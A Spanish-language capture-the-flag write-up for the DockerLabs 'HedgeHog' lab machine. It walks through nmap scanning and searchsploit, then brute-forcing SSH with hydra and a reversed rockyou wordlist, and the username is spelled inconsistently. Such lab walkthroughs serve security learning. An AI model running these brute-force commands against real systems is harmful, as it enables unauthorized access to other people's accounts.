# DockerLabs - HedgeHog
## Resumen 
* **Dificultad:** Muy facil
* **Tiempo:** ~50 minutos
* **Fecha:** 22/04/26
## Info 
| | |
|-------|-------|
| IP | 172.17.0.2 |
| OS | Linux (Docker) |
| Puertos abiertos | 22,80 |
## Reconocimiento de puertos
Ejecutamos un ```nmap``` para ver que puertos estan abiertos.
```bash
nmap -sV 172.17.0.2
```
> El parametro -sV se usa para ver tambien la version.
> 
| Puerto | Servicio | Version |
|--------|--------|-------|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | httpd 2.4.58 |
## Busqueda de vulnerabilidades 
Despues, he ejecutado ```searchsploit``` para ver si tenian exploits conocidos alguina de las versiones, pero no habia ninguna explotable.
## Enumeracion de la web
Se accede a la IP por web y se ve que pone solamente ```trails```, se entiende que sera el usuario.
## Ataque de fuerza bruta con hydra a SSH
Primero ejecute ```hydra -l trails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2``` pero se iba a tomar horas en completarse, por lo que probe a empezar por abajo de la lista, usando ```tac```, que funciona como un ```cat``` al reves.
```bash
tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > /tmp/rockyou-rev.txt 
# La ruta del final es donde se guardara el archivo
```
Ahora se ejecuta hydra pero con la nueva wordlist.
```bash
hydra -l tails -P /tmp/rockyou-rev.txt ssh://172.17.0.2 -t 4
```
> -l sirve para indicar el usuario y -P busca la contraseña en una wordlist.
